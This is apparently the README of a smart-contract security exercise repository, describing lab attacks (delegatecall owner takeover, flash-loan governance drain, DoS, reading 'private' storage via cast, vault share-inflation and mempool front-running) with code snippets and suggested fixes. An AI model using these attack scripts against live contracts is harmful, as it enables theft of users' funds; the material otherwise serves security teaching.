# Smart Contract Hacking

This is a comprehensive summary of various smart contract hacking techniques and codes, intended to serve as a detailed resource for those interested in understanding and exploiting vulnerabilities within smart contracts. This repository aims to provide an extensive range of examples and in-depth explanations to enhance knowledge and practical skills in the field of blockchain security.

## Setup and Test

### install
```
nvm use 18
yarn
```

### build & test
```
cp .env.sample .env
yarn build
yarn test
```

### test for DOS attack exercise 1 and DAO attack exercise 2
Testing the DOS Attacks Exercise 1 located in `test/longer/2-dao-attack-2.ts` and `test/longer/3-dos-1.ts` takes a so long time. Therefore, you should test only this exercise using `yarn dos1` or  `yarn dao2`.

### test for Optimizer Vault exercise 1
The converted TypeScript version of this test doesn't work. You should test it in a JavaScript environment.
```shell
cd javascript-ex
yarn
yarn build
yarn test
```

### CAUTION!
These exercises include free RPC URLs to connect to the Ethereum mainnet and Goerli network. However, you may encounter rate limits for making calls in a short period. If something goes wrong during testing with `yarn test`, I recommend testing each test separately.

This is the error message that appears when the above situation occurs.
```
"after all" hook for "Exploit":
   Error: could not decode result data (value="0x", info={ "method": "isLocked", "signature": "isLocked()" }, code=BAD_DATA, version=6.13.2)
   at makeError (node_modules/ethers/src.ts/utils/errors.ts:694:21)
   at assert (node_modules/ethers/src.ts/utils/errors.ts:715:25)
   at Interface.decodeFunctionResult (node_modules/ethers/src.ts/abi/interface.ts:916:15)
   at staticCallResult (node_modules/ethers/src.ts/contract/contract.ts:346:35)
   at async staticCall (node_modules/ethers/src.ts/contract/contract.ts:303:24)
   at async Proxy.isLocked (node_modules/ethers/src.ts/contract/contract.ts:351:41)
   at async Context.<anonymous> (test/4-sensitive-on-chain-data-2.ts:59:44)
```

# List of Smart Contract Hacking
- [Call Attack](#call-attack)
- [DAO Attack](#dao-attack)
- [DOS Attack](#dos-attack)
- [Sensitive Onchain Data](#sensitive-on-chain-data)
- [Unchecked Return](#unchecked-return-attack)
- [Optimizer Vault](#optimizer-vault)
- [Oracle Manipulation](#oracle-manipulation)
- [SELFDESTRUCT opcode](#selfdestruct-opcode)
- [Front Running](#front-running)

## Call Attack

### Exercise 1
- [RestrictedOwner.sol](contracts/1-call-attack-1/RestrictedOwner.sol)
- [UnrestrictedOwner.sol](contracts/1-call-attack-1/UnrestrictedOwner.sol)
- [5-unchecked-return-1.ts](test/1-call-attack-1.ts)

#### Overview
The callee of the `delegatecall` by a caller has the context of the caller's storage and has the right to change the caller's storage.

#### Attack Vector
```typescript
contract RestrictedOwner {

  address public owner;
  ...

  fallback() external {
    (bool result,) = unrestrictedOwnerAddress.delegatecall(msg.data);
    if (!result) {
      revert("failed");
    }
  }
}
```

```typescript
contract UnrestrictedOwner {
  address public owner;

  function changeOwner(address _newOwner) public {
    owner = _newOwner;
  }
}
```
These two contracts have storage variables with the same name, `owner`. If an attacker makes an unmatched function call, which triggers the `fallback` function and subsequently calls the `changeOwner` function of `UnrestrictedOwner`, the `owner` storage value will be changed.

#### Soultion
1. **Avoid Delegatecall for Sensitive Operations**: Refrain from using `delegatecall` for critical operations that could alter sensitive storage variables.
2. **Input Validation**: Validate inputs to ensure that the data being passed through `delegatecall` is expected and allowable.


## DAO Attack
### Exercise 1
- [RainbowAllianceToken.sol](contracts/2-dao-attack-1/RainbowAllianceToken.sol)
- [2-dao-attack-1.ts](test/2-dao-attack-1.ts)

#### Attack Vector
```typescript
# RainbowAllianceToken.sol

function mint(address _to, uint256 _amount) public onlyOwner {
  _mint(_to, _amount);
  getVotingPower[_to] += _amount;
}

function vote(uint _id, bool _decision) external {
  require(getVotingPower[msg.sender] > 0, "no voting rights");
  require(!voted[_id][msg.sender], "already voted");
  Proposal storage proposal = getProposal[_id];
  ...
}
```
This function is a member of a DAO contract that inherits from ERC20. This type of accounting creates a vulnerability because a malicious voter can retain voting power even after transferring their deposit funds.

```typescript
# RainbowAllianceToken.sol

function vote(uint _id, bool _decision) external {
  require(getVotingPower[msg.sender] > 0, "no voting rights");
  require(!voted[_id][msg.sender], "already voted");
  Proposal storage proposal = getProposal[_id];
  ...
}
```
The attacker can retain voting power after transferring their deposit funds because `getVotingPower` remains the same as before.

#### Solution
We have to calculate the voting power in transfer-like functions also.

---
### Exercise 2
- [TheGridDAO.sol](contracts/2-dao-attack-2/TheGridDAO.sol)
- [TheGridTreasury.sol](contracts/2-dao-attack-2/TheGridTreasury.sol)
- [2-dao-attack-2.ts](test/longer/2-dao-attack-2.ts)

#### Attack Vector
An attacker can get their proposal approved by transferring their deposit funds to a newly created temporary wallet and having that wallet vote for the proposal. The attacker can repeat this process by transferring the funds to another wallet, thereby accumulating enough votes to get the proposal approved.

#### Solution
We need to calculate the voting power in transfer-like functions as the solution for exercise 1.

#### Exercise 3
- [DAOToken.sol](contracts/2-dao-attack-3/DAOToken.sol)
- [Governance.sol](contracts/2-dao-attack-3/Governance.sol)
- [LendingPool.sol](contracts/2-dao-attack-3/LendingPool.sol)
- [Treasury.sol](contracts/2-dao-attack-3/Treasury.sol)
- [AttackDAO.sol](contracts/2-dao-attack-3/solution/AttackDAO.sol)
- [2-dao-attack-3.ts](test/2-dao-attack-3.ts)

##### Attack Vector
An attacker can borrow a flash loan to vote for their malicious proposal with the significant voting power acquired from the flash loan. Refer to this flash loan code in the attacker contract.
```typescript
# AttackDAO.sol

function attack() external {
  require(msg.sender == owner, "not owner");
  IPool(pool).flashLoan(IERC20(token).balanceOf(pool));
}

function callBack(uint borrowAmount) external {
  require(msg.sender == pool, "not pool");

  uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);
  IGovernance(governance).executeInvestment(investmentId);

  IERC20(token).transfer(pool, borrowAmount);
}
```

#### Solution
We need to consider using `ERC20Snapshot` for the DAO contract, as demonstrated in Exercise 2.

---
## DOS Attack

### Exercise 1
- [TokenSale.sol](contracts/3-dos/TokenSale.sol)
- [test/3-dos-attack-1.ts](test/longer/3-dos-1.ts)

#### Attack Vector
```typescript
# 3-dos-attack-1.ts

const ATTACKER_INVESTMENT = parseEther('0.000000000001');
for (let i = 0; i < 10000; i++) {
    await tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENT });
}
```
If an attacker invests a small amount of money numerous times in an ICO, the ICO contract may fail to distribute its ERC20 tokens because the gas limit is exceeded with the following code.

```typescript
# TokenSale.sol

function distributeTokens() public onlyOwner {
  for(uint i = 0; i < investors.length; i++) {
    address currentInvestor = investors[i];
    uint[] memory userInvestments = invested[currentInvestor];

    // investor => [0.0000001, 0.00000001, .....]
    for(uint i = 0; i < userInvestments.length; i++) {
      _mint(currentInvestor, userInvestments[i]);
      emit DistributedTokens(currentInvestor, userInvestments[i]);
    }
  }
}
```

### Exercise 2
- [Auction.sol](contracts/3-dos/Auction.sol)
- [AttackAuction.sol](contracts/3-dos/AttackAuction.sol)
- [3-dos-attack-2.ts](test/3-dos-2.ts)

#### Attack Vector
```typescript
# 3-dos-attack-2.ts

const attackAuction = await deployContract('AttackAuction', [auction.target], {
    value: currentHighestBid + parseEther('0.00000001')
});
let highestBid = await auction.highestBid();
```

If the `AttackAuction` contract doesn't have any payable function, the following contract function will always fail after the attacker bids. As a result, the bid will no longer work.

```typescript
# Auction.sol

function bid() external payable {
  require(msg.value > highestBid);

  require(currentLeader.send(highestBid));

  currentLeader = payable(msg.sender);
  highestBid = msg.value;
}
```

### Exercise 3
- [FlashLoanUser.sol](contracts/3-dos/FlashLoanUser.sol)
- [ShibaPool.sol](contracts/3-dos/ShibaPool.sol)
- [ShibaToken.sol](contracts/3-dos/ShibaToken.sol)
- [3-dos-attack-3.ts](test/2-dao-attack-3.ts)

#### Attack Vector
```typescript
function flashLoan(uint256 borrowAmount) external nonReentrant {
  // Checks
  require(borrowAmount > 0, "amount should be greater than 0");
  uint256 balanceBefore = shibaToken.balanceOf(address(this));
  require(poolBalance == balanceBefore, "Accounting Issue");
  ...
}
```
This kind of code can create an accounting issue because the `poolBalance` may differ from `shibaToken.balanceOf(address(this))`. An attacker can render the code unusable with the following method.
```typescript
await token.connect(attacker).transfer(pool.target, parseEther('1'));
```

#### Solution
We have to add calculating code in the payable `receive` function.

---
## Sensitive On-Chain Data

### Exercise 1
- [SecureDoor.sol](contracts/0-sensitive-on-chain-data/SecretDoor.sol)
- [0-sensitive-on-chain-data-1.ts](test/0-sensitive-on-chain-data-1.ts)

#### Attack Vector
```typescript
contract SecretDoor is Ownable, ReentrancyGuard {
  bool public isLocked;
  uint8 private doorNumber;
  bytes32 private doorOwnerName;
  bytes32 private secretSpell;
  ...
}
```
Private variables are not truly private because the data can be found using block explorers or tools like `cast` if an attacker knows the contract address and can guess which storage slots are used for the private variables. The following `cast` command is an example.
```shell
cast storage 0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c 3 --rpc-url https://rpc.ankr.com/bsc
```
- `0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c` is the contract address.
- `3` is the storage slot.

#### Solution
Remember that private storage variables are never truly private!

### Exercise 2
- [CrypticRaffle.sol](contracts/0-sensitive-on-chain-data/CrypticRaffle.sol)
- [0-sensitive-on-chain-data-2.ts](test/0-sensitive-on-chain-data-2.ts)

#### Attack Vector
```typescript
function newRaffle(uint8[3] calldata numbers) external onlyOwner {
    raffleId += 1;
    raffles[raffleId] = numbers;
    isActive = true;
}
```
If you create a contract for a lottery system where users guess numbers, the new secret numbers should be set periodically by the owner. However, what if an attacker knows the `contract address` and the `sighash` for a function like `newRaffle`?

The details are as follows:
```
CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000001 (?)
Slot 3: 0x0000000000000000000000000000000000000000000000000000000000000004 (?)

0xc2847b3b - guessNumber sighash
0x3f5a9a5f - newRaffle sighash

Our Block Number: 8660077
Winning TX Block Number: 8660110

Winning transaction:
https://goerli.etherscan.io/tx/0xdb4b3952c434c2c6c0044a5c74e67219f21ecacb8f4ed1bfcd66d97be6cafece

Input data:
0xc2847b3b00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

[HEX]  [DEC]
de --> 222
7e --> 126
47 --> 71

Deployed on block: 8655090

newRaffle trnasaciton (from the owner):
https://goerli.etherscan.io/tx/0xdab60e3d7187d9c10b32589a1801d4f6bd0b8830635c5051b9f9f5301fee9f90

Input data:
0x3f5a9a5f00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

```

#### Solution
Remember that private storage variables are never truly private, again!

---
## Unchecked Return Attack

### Exercise 1
- [DonationMaster.sol](contracts/5-unchecked-return-1/DonationMaster.sol)
- [DonationMasterSecured.sol](contracts/5-unchecked-return-1/DonationMasterSecured.sol)
- [MultiSigSafe.sol](contracts/5-unchecked-return-1/MultiSigSafe.sol)
- [MultiSigSafeSecured.sol](contracts/5-unchecked-return-1/MultiSigSafeSecured.sol)
- [5-unchecked-return-1.ts](test/5-unchecked-return-1.ts)

#### Attack Vector
1. Low-level calls like `send`, `call`, `delegatecall`, and `staticcall` do not revert automatically.
2. If you don't check the return value when sending ETH, you can lose the money.
3. This is a bad pattern to follow.
```
payable(_to).send(_amount);
```
or
```
payable(donation.to).call{value: msg.value}("");
```
#### Solution
```
(bool success, ) = payable(donation.to).call{value: msg.value}("");
require(success, "donation failed, couldn't send ETH");
```

---
## Optimizer Vault

### Exercise 1
- [OptimizerStrategy.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerStrategy.sol)
- [OptimizerStrategyManager.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerStrategyManager.sol)
- [OptimizerVault.sol](javascript-ex/contracts/6-optimizer-vault-1/OptimizerVault.sol)
- [YieldContract.sol](javascript-ex/contracts/6-optimizer-vault-1/YieldContract.sol)

#### build & test
```shell
cd javascript-ex
yarn
yarn build
yarn vault1
```

#### Attack Vector
```typescript
# OptimizerVault.sol

function deposit(uint256 _amount) external nonReentrant {
  uint256 _pool = balance();

  want().safeTransferFrom(msg.sender, address(this), _amount); // @notice we do not check for deflationary tokens
  sendToStrat();

  uint256 shares = 0;
  if (totalSupply() == 0) shares = _amount;
  else shares = ((_amount * totalSupply()) / _pool);

  uint256 total = totalSupply();

  _mint(msg.sender, shares);
}
```
The formula for calculating the share of newly deposited amounts is very vulnerable because it does not account for the remainder after dividing. If the shares are calculated to be 1.9, the result in Solidity is 1.

The fomula like this.
1. `total_share` : `total_pool` = **`deposit_share`** : `deposit_amount`
2. **`deposit_share`** = `deposit_amount` * `total_share` / `total_pool`

If an attacker knows the vulnerability, they can exploit the vault through **front-running** as follows.
```typescript
# 6-optimizer-vault-1.js

// Get all the tx's in the mempool
const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
  "pending",
  true,
]);

// You see that bob is going to be the first depositor in the vault, with $200,000.
const bobDeposit = pendingBlock.transactions.find((tx) => tx.to.toLowerCase() == this.vault.address.toLowerCase());

// You front-run bob so that you are the first depositor
await this.vault.connect(attacker).deposit(1, {
  gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
});

// You do something sneaky that allows you to take some of bob's funds!
await this.usdc.connect(attacker).transfer(this.vault.address, ethers.utils.parseUnits("100000", 6), {
  gasPrice: ethers.BigNumber.from(bobDeposit.gasPrice).add(1)
});
```

These are the data values on `OptimizerVault`'s `deposit` function called in each transaction.
| Tx         | total_pool | total_share | deposit_amount | deposit_share | memo             |
| ---------- | ---------- | ----------- | -------------- | ------------- | ---------------- |
| Attacker 1 | 0          | 0           | 1              | 1             | Initial data set |
| Attacker 2 | 1          | 1           | 0              | 0             | No change        |
| Bob        | 100,001    | 1           | 200,000        | 1             | Too small        |
 
`1.999980000199998` (deposit_share) = `200,000` (deposit_amount) * `1` (total_share) / `100,001` (total_pool)
However, `0.999980000199998` is discarded in Solidity.

As a result, the attacker can retrieve approximately `$150,000` for an initial deposit of `$100,001`.

#### Solution
1. **Use a Higher Precision Library**: Utilize a higher precision arithmetic library, like Fixed-Point arithmetic libraries, to minimize the loss due to rounding errors.


---
## Oracle Manipulation

### Exercise 1
- [GoldExchange.sol](contracts/7-oracle-manipulation-1/GoldExchange.sol)
- [GoldOracle.sol](contracts/7-oracle-manipulation-1/GoldOracle.sol)
- [GoldToken.sol](contracts/7-oracle-manipulation-1/GoldToken.sol)
- [7-oracle-manipulation-1.ts](test/7-oracle-manipulation-1.ts)

#### Attack Vector
```typescript
contract GoldOracle {
  address[] sources;
  mapping(address => uint256) public getPriceBySource;

  modifier onlySource() {
    bool isSource = false;
    for (uint i = 0; i < sources.length; i++) {
      if (msg.sender == sources[i]) {
        isSource = true;
      }
    }
    require(isSource, "Not a source");
    _;
  }

  ...

  function postPrice(uint256 newPrice) external onlySource {
    _setPrice(msg.sender, newPrice);
  }
  ...
}
```
If the keys of sources are compromized, the gold price can be manipulated.

#### Solution

1. **Multi-Sig for Sources**: Use a multi-signature mechanism so that multiple approvals are needed to update the price.
2. **Decentralized Oracles**: Aggregate data from multiple decentralized oracle sources to reduce reliance on individual entities.
3. **Reputation-Based Systems**: Implement a mechanism where sources build a reputation over time, and less trusted sources have less influence.
4. **Consensus Mechanism**: Implement a consensus algorithm among sources to agree on the price.
5. **Price Validations**: Implement validation checks to ensure that the new price is within reasonable bounds.
6. **Time-Locked Updates**: Time-lock the updates so that any change in price will take effect only after a certain period, giving time for review.

---
## SELFDESTRUCT opcode

### Exercise 1
- [EtherGame.sol](contracts/8-selfdestruct-1/EtherGame.sol)
- [GameAttack.sol](contracts/8-selfdestruct-1/GameAttack.sol)
- [8-selfdestruct-1.ts](test/8-selfdestruct-1.ts)

#### Attack Vector
```typescript
# EtherGame.sol
function deposit() public payable {
  require(msg.value == 1 ether, "You can only send 1 Ether");

  uint256 balance = address(this).balance;
  require(balance <= targetAmount, "Game is over");

  if (balance == targetAmount) {
    winner = msg.sender;
  }
}
```

The "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). But an attacker can call the function in any contracts and have its Ether transfered, so you should be cautious about using `address(this).balance`.

An attacker can disable the deposit function by causing the `require` statement `require(balance <= targetAmount, "Game is over");` to repeatedly fail.

#### Solution
Don't rely on address(this).balance

```typescript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract EtherGame {
    uint256 public targetAmount = 3 ether;
    uint256 public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```


## Front Running


### Exercise 1
- [FindMe.sol](contracts/9-front-running-1/FindMe.sol)
- [9-front-running-1.ts](test/9-front-running-1.ts)

This is the scenario. A pirate wrote a smart contract named `FindMe` for a treasure hunt game where the first person to find the hidden solution string can claim a reward of 10 ether using its `claim()` function.

Can you find the secret answer and claim the prize?

#### Attack Vector
- You can always detect all the transactions in the `mempool` on Ethereum blockchain with the [`eth_getBlockByNumber`](https://ethereum.github.io/execution-apis/api-documentation/) method.
-  You can front-run your transaction with more fee than the original transaction's fee.

#### Solution
1. Get all the transactions.
```typescript
const pendingBlock = await provider.send('eth_getBlockByNumber', ['pending', true]);
```
2. Find the transaction that goes to the pirate's smart contract.
```typescript
let transaction = pendingBlock.transactions.find(
  (tx: any) => tx.to?.toLowerCase() == (findMe.target as string).toLowerCase()
);
```
3. Send transaction with more gas fee. You only need one more gas.
```typescript
await attacker.sendTransaction({
  to: transaction.to,
  data: transaction.input,
  gasPrice: transaction.gasPrice + 1,
  gasLimit: transaction.gas,
});
```

### Flash Loan Attack
_Will be added soon._

### Replay Attack
_Will be added soon._

### DEFI Money Markets
_Will be added soon._